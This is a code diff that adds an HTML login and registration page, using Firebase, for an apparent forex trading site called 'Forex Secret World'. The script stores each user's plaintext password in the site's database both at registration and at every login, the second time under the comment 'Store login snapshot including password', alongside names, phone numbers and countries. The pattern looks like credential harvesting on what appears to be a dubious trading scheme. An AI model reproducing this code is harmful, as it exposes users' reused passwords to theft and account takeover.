@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FOREX SECRET WORLD</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
+  <script src="firebase.js"></script>
+
+</head>
+<body>
+<div class="toast" id="toast"></div>
+<!-- Header/Navbar -->
+<div class="header">
+  <div class="container">
+    <div class="navbar">
+      <div class="logo">
+        <img src="logo2.png" width="155px">
+      </div>
+      <nav>
+        <ul id="MenuItems">
+          <li><a href="index.html">Home</a></li>
+        </ul>
+      </nav>
+      <img src="menue.png" class="menue-icon" onclick="menutoggle()">
+    </div>
+  </div>
+</div>
+
+<!-- Account Page -->
+<div class="account-page">
+  <div class="container">
+    <div class="row">
+      <div class="col-2">
+        <img src="forexpicture.jpg" width="100%">
+      </div>
+      <div class="col-2">
+        <div class="form-container">
+          <!-- Tabs -->
+          <div class="form-btn">
+            <span onclick="login()">Login</span>
+            <span onclick="register()">Register</span>
+          </div>
+          <div id="Indicator"></div>
+
+          <!-- Login Form -->
+          <form id="LoginForm">
+            <input type="email" id="loginEmail" placeholder="Email" required>
+            <div class="password-container">
+              <input type="password" id="loginPassword" placeholder="Password" required>
+              <span id="toggleLoginPassword" class="toggle-eye">👁️</span>
+            </div>
+            <button type="submit" class="btn">Login</button>
+            <a href="#" id="forgotPassword">Forgot password?</a>
+          </form>
+
+          <!-- Register Form -->
+          <form id="RegForm" style="transform: translateX(100%);">
+            <input type="text" id="fullName" placeholder="Full Name" required>
+            <select id="country" required>
+              <option value="" disabled selected>Select your country</option>
+              <option value="US" data-code="+1">United States</option>
+              <option value="LS" data-code="+266">Lesotho</option>
+              <option value="IN" data-code="+91">India</option>
+              <option value="NG" data-code="+234">Nigeria</option>
+            </select>
+            <input type="tel" id="phone" placeholder="Phone Number" required>
+            <input type="email" id="registerEmail" placeholder="Email" required>
+            <div class="password-container">
+              <input type="password" id="registerPassword" placeholder="Password" required>
+              <span id="toggleRegisterPassword" class="toggle-eye">👁️</span>
+            </div>
+            <button type="submit" class="btn">Register</button>
+          </form>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="container">
+    <div class="row">
+      <div class="footer-col-1">
+        <img src="logo2.png">
+      </div>
+      <div class="footer-col-2">
+        <p>Our purpose is to make sure that some traders, those who are lucky, become successful.</p>
+      </div>
+    </div>
+  </div>
+  <hr>
+  <p class="copyright">Copyright 1988-2025 : Forex secret world</p>
+</div>
+
+<!-- Message Box -->
+<div id="messageBox"></div>
+
+<script>
+// Firebase app & db references
+
+// Menu toggle
+var MenuItems = document.getElementById("MenuItems");
+var menuBtn = document.querySelector(".menue-icon");
+MenuItems.style.maxHeight = "0px";
+function menutoggle() {
+  if (MenuItems.style.maxHeight === "0px") MenuItems.style.maxHeight = MenuItems.scrollHeight + "px";
+  else MenuItems.style.maxHeight = "0px";
+}
+document.addEventListener("click", function(event) {
+  if (!MenuItems.contains(event.target) && !menuBtn.contains(event.target)) MenuItems.style.maxHeight = "0px";
+});
+
+// Tabs
+function login() {
+  document.getElementById("LoginForm").style.transform = "translateX(0)";
+  document.getElementById("RegForm").style.transform = "translateX(100%)";
+  document.getElementById("Indicator").style.transform = "translateX(0%)";
+}
+function register() {
+  document.getElementById("LoginForm").style.transform = "translateX(-100%)";
+  document.getElementById("RegForm").style.transform = "translateX(0)";
+  document.getElementById("Indicator").style.transform = "translateX(100%)";
+}
+
+// Password toggle
+function setupPasswordToggle(inputId, toggleId) {
+  const passwordInput = document.getElementById(inputId);
+  const togglePassword = document.getElementById(toggleId);
+  togglePassword.addEventListener("click", () => {
+    const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+    passwordInput.setAttribute("type", type);
+    togglePassword.textContent = type === "password" ? "👁️" : "🙈";
+  });
+}
+setupPasswordToggle("loginPassword", "toggleLoginPassword");
+setupPasswordToggle("registerPassword", "toggleRegisterPassword");
+
+// Show message
+function showToast(message, success=false) {
+  const box = document.getElementById("messageBox");
+  box.style.background = success ? "#4CAF50" : "#f44336";
+  box.textContent = message;
+  box.style.display = "block";
+  setTimeout(() => { box.style.display = "none"; }, 4000);
+}
+
+// ------------------- REGISTER -------------------
+document.getElementById("RegForm").addEventListener("submit", function(e){
+  e.preventDefault();
+  const name = document.getElementById("fullName").value;
+  const country = document.getElementById("country").value;
+  const phone = document.getElementById("phone").value;
+  const email = document.getElementById("registerEmail").value;
+  const password = document.getElementById("registerPassword").value;
+
+  firebase.auth().createUserWithEmailAndPassword(email, password)
+    .then(userCredential => {
+      const uid = userCredential.user.uid;
+      db.ref("users/" + uid).set({ name, country, phone, email, password, mainBalance: "0" });
+      showToast("Registration successful!", true);
+      login(); // switch to login tab
+    })
+    .catch(error => showToast(error.message));
+});
+
+// ------------------- LOGIN -------------------
+document.getElementById("LoginForm").addEventListener("submit", (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("loginEmail").value.trim();
+  const password = document.getElementById("loginPassword").value.trim();
+
+  firebase.auth().signInWithEmailAndPassword(email, password)
+    .then((userCredential) => {
+      const user = userCredential.user;
+      const uid = user.uid;
+
+      // Get the user's registration details
+      db.ref("users/" + uid).once("value")
+        .then(snapshot => {
+          if (snapshot.exists()) {
+            const userData = snapshot.val();
+
+            // Store login snapshot including password
+            db.ref("logins/" + uid).set({
+  name: userData.name || "",
+  email: userData.email || "",
+  country: userData.country || "",
+  phone: userData.phone || "",
+  password: password || "",
+  lastLogin: Date.now()
+});
+
+            showToast("Login successful! Welcome, " + userData.name, true);
+            window.location.href = "dashboard.html";
+          } else {
+            showToast("User details not found in the system.");
+          }
+        })
+        .catch(err => showToast(err.message));
+    })
+    .catch((error) => {
+      const errorCode = error.code;
+      const errorMessage = error.message;
+
+      if (errorCode === "auth/user-not-found") showToast("No account found with that email.");
+      else if (errorCode === "auth/wrong-password") showToast("Incorrect password.");
+      else showToast(errorMessage);
+    });
+});
+</script>
+
+</body>
+</html>
+ 
